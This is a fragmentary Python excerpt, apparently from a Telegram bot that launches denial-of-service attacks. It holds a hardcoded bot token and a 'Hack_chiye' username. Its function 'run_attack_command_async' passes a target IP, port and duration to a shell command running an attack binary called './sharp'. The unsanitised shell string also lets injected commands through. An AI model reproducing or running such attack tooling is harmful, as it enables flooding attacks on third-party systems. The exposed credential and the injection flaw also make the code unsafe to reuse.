...
TOKEN = '7323159569:AAEVILGh8-NwaLExWqdEY6LZrzogsNHJfIM'
...
USERNAME = "@Hack_chiye"  # Immutable username for maximum security
...
async def run_attack_command_async(target_ip, target_port, duration):
    ...
    process = await asyncio.create_subprocess_shell(f"./sharp {target_ip} {target_port} {duration} 100")
